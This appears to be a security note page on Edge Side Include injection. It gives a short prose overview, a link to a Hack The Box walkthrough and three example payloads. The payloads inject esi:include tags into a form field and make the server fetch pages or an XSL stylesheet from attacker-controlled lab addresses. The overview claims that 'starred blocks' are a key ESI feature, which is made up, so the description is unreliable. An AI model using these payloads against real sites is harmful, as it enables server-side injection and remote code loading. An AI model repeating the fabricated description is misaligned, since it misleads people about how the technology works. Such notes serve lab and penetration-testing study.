---
tags:
  - Enumeration
  - TCP
  - HTTP
  - Concepts
  - Vulnerabilities
---
Edge Side Include (ESI) is a markup language and protocol used for dynamic web content assembly. It allows for the inclusion of fragments of content from different sources into a single web page, improving performance and scalability by offloading processing tasks to the edge servers.

One of the key features of ESI is the use of starred blocks, which are placeholders within the markup that indicate where dynamic content should be inserted. These starred blocks can be filled with content from various sources, such as backend servers, caching layers, or third-party APIs, allowing for a highly flexible and modular approach to content assembly.

By using ESI and starred blocks, developers can create dynamic web pages that are fast, scalable, and easily maintainable. This technology is particularly useful for websites with high traffic volumes or complex content requirements, as it allows for efficient caching strategies and reduces server load by distributing processing tasks across multiple edge servers.

Overall, ESI and starred blocks offer a powerful solution for managing dynamic web content and optimizing performance at the edge of the network. By leveraging these technologies, developers can create responsive and engaging web experiences that meet the demands of modern online users.

# Walkthrough

* [HTB: Quick | 0xdf hacks stuff](https://0xdf.gitlab.io/2020/08/29/htb-quick.html)

# Example

```
title=test&msg=test&id=TKT-7261<esi:include src="http://10.10.14.47/poc.html" />
```

```
<esi:include src="http://192.168.49.190/poc.html" />
```

```
<esi:include src="http://localhost/" stylesheet="http://10.10.14.47/esi.xsl">
</esi:include>
```
